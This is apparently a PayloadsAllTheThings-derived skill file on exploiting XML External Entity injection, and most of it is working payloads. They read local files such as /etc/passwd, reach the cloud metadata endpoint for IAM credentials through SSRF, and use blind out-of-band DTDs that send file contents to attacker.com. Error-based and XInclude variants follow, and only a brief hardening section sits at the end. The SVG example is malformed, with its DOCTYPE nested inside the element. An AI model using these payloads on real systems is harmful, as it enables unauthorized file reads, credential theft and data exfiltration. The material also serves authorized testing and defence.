---
name: xxe
description: Exploit XML External Entity injection — file read, SSRF, blind via parameter entities and OOB DTDs, billion laughs DoS, XInclude variant
domain: cybersecurity
subdomain: web-application-security
tags: [xxe, xml, external-entity, oob-dtd, ssrf]
version: "1.0"
license: MIT
source: PayloadsAllTheThings/XXE Injection
---

# XML External Entity (XXE)

## Overview
XML parsers that resolve external entities by default let attackers reference local files, remote URLs (SSRF), and craft DoS payloads. Even with output blinded, OOB parameter-entity DTDs exfiltrate.

## Where to Test
Any endpoint accepting XML: SOAP, RSS, SAML, DOCX/XLSX (XML inside zip), SVG uploads, RSS readers, XML-RPC, OpenSearch, CVS/RSS imports.

## Classic File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

## SSRF
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

## PHP Wrappers (base64 for binary files / source code)
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

## Blind XXE via OOB DTD
Local app blocks DOCTYPE inline but allows external DTD reference:
```xml
<?xml version="1.0"?>
<!DOCTYPE r SYSTEM "http://attacker.com/x.dtd">
<r>&exfil;</r>
```
`x.dtd`:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

## Error-based Blind (no OOB needed)
Force parse error containing file content:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nofile/%file;'>">
%eval;
%error;
```

## XInclude (when DOCTYPE blocked)
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## SVG XXE
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
  <text>&xxe;</text>
</svg>
```

## DoS (Billion Laughs)
See Denial of Service skill.

## Tools
- **XXEinjector**.
- Burp Scanner + manual OOB via Collaborator.

## Hardening
- Disable DTDs / external entities in parser config:
  - Java: `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`.
  - PHP: `libxml_disable_entity_loader(true)` (deprecated PHP 8 — default safe).
  - Python: `defusedxml` library.
  - .NET: `XmlReaderSettings { DtdProcessing = Prohibit }`.
- Disable XInclude.
- Use JSON where possible.

## References
- `payloadsallthethings/XXE Injection/README.md`
- OWASP XXE Prevention Cheat Sheet.
